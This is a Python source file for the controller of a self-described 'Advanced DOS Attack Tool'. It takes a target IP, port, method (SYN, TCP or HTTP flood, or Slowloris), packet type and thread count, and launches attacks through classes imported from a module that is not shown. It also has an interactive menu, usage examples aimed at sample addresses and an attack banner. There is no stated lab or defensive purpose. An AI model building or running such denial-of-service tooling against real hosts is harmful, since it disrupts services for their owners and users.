#!/usr/bin/env python3

import sys
import argparse
import signal
from typing import NoReturn, Optional
from attack_methods import DOSAttack, SlowLoris
from utils import InputValidator, Logger, Statistics

class DOSController:
    def __init__(self):
        self.logger = Logger()
        self.stats = Statistics()
        self.attack: Optional[DOSAttack] = None
        self.setup_signal_handlers()

    def setup_signal_handlers(self) -> None:
        """Setup handlers for graceful shutdown"""
        signal.signal(signal.SIGINT, self.handle_shutdown)
        signal.signal(signal.SIGTERM, self.handle_shutdown)

    def handle_shutdown(self, signum: int, frame) -> None:
        """Handle shutdown signals"""
        print("\n[!] Shutting down...")
        if self.attack:
            self.attack.stop_attack()
        sys.exit(0)

    def validate_target(self, target: str, port: int) -> bool:
        """Validate target and port"""
        if not InputValidator.validate_ip(target):
            self.logger.log_error(f"Invalid target IP address: {target}")
            return False
        
        if not InputValidator.validate_port(port):
            self.logger.log_error(f"Invalid port number: {port}")
            return False
        
        return True

    def start_attack(self, args: argparse.Namespace) -> None:
        """Initialize and start the attack"""
        if not self.validate_target(args.target, args.port):
            return

        # Initialize attack based on method
        try:
            if args.method.lower() == "slowloris":
                self.attack = SlowLoris(args.target, args.port, args.threads)
            else:
                self.attack = DOSAttack(args.target, args.port, args.method, args.packet_type, args.threads)  # Pass packet_type

            # Log attack start
            self.logger.log_attack_start((args.target, args.port), args.method)
            self.logger.log_attack_details((args.target, args.port), args.method, args.packet_type, "Started")

            # Start the attack
            self.attack.start_attack()
            self.logger.log_attack_details((args.target, args.port), args.method, args.packet_type, "In Progress")
        except ValueError as ve:
            self.logger.log_error(f"Value error: {str(ve)}")
            print(f"[!] Value error occurred: {str(ve)}")
        except Exception as e:
            self.logger.log_error(f"An error occurred: {str(e)}")
            print(f"[!] An unexpected error occurred: {str(e)}")
        finally:
            if self.attack:
                self.attack.stop_attack()
                self.logger.log_attack_details((args.target, args.port), args.method, args.packet_type, "Stopped")

    def display_menu(self) -> None:
        """Display the main menu"""
        while True:
            print("\n=== DOS Attack Tool ===")
            print("1. Start Attack")
            print("2. View Statistics")
            print("3. Configure Proxy")
            print("4. Exit")
            choice = input("Select an option: ")

            if choice == "1":
                self.start_attack_menu()
            elif choice == "2":
                self.view_statistics()
            elif choice == "3":
                self.configure_proxy()
            elif choice == "4":
                print("Exiting...")
                sys.exit(0)
            else:
                print("Invalid choice. Please try again.")

    def start_attack_menu(self) -> None:
        """Menu to start an attack"""
        target = input("Enter target IP: ")
        port = int(input("Enter target port: "))
        method = input("Enter attack method (syn/tcp/http/slowloris): ")
        packet_type = input("Enter packet type (tcp/udp): ")
        threads = int(input("Enter number of threads: "))

        args = argparse.Namespace(target=target, port=port, method=method, packet_type=packet_type, threads=threads)
        self.start_attack(args)

    def view_statistics(self) -> None:
        """Display attack statistics"""
        stats = self.stats.get_stats()
        print(f"Duration: {stats['duration']} seconds")
        print(f"Packets Sent: {stats['packets_sent']}")
        print(f"Successful Connections: {stats['successful_connections']}")
        print(f"Failed Connections: {stats['failed_connections']}")
        print(f"Success Rate: {stats['success_rate']}%")
        print(f"Packets per Second: {stats['packets_per_second']}")

    def configure_proxy(self) -> None:
        """Configure proxy settings"""
        proxy = input("Enter proxy address (e.g., http://proxy:port): ")
        print(f"Proxy configured: {proxy}")

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Advanced DOS Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python dos_attack.py -t 192.168.1.1 -p 80 -m syn -pt tcp
  python dos_attack.py -t 10.0.0.1 -p 443 -m http -th 200 -pt udp
  python dos_attack.py -t 172.16.0.1 -p 80 -m slowloris -th 150
        """
    )

    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument(
        "-m", "--method",
        choices=["syn", "tcp", "http", "slowloris"],
        default="syn",
        help="Attack method (default: syn)"
    )
    parser.add_argument(
        "-pt", "--packet_type",
        choices=["tcp", "udp"],
        default="tcp",
        help="Type of packet to use (default: tcp)"
    )
    parser.add_argument(
        "-th", "--threads",
        type=int,
        default=100,
        help="Number of threads (default: 100)"
    )

    return parser.parse_args()

def print_banner() -> None:
    """Print tool banner"""
    banner = """
╔══════════════════════════════════════════╗
║          Advanced DOS Attack Tool         ║
║                                          ║
║    [SYN Flood] [TCP Flood] [HTTP Flood]  ║
║             [Slowloris]                  ║
╚══════════════════════════════════════════╝
    """
    print(banner)

def main() -> NoReturn:
    """Main entry point"""
    print_banner()
    
    controller = DOSController()
    controller.display_menu()

if __name__ == "__main__":
    main()
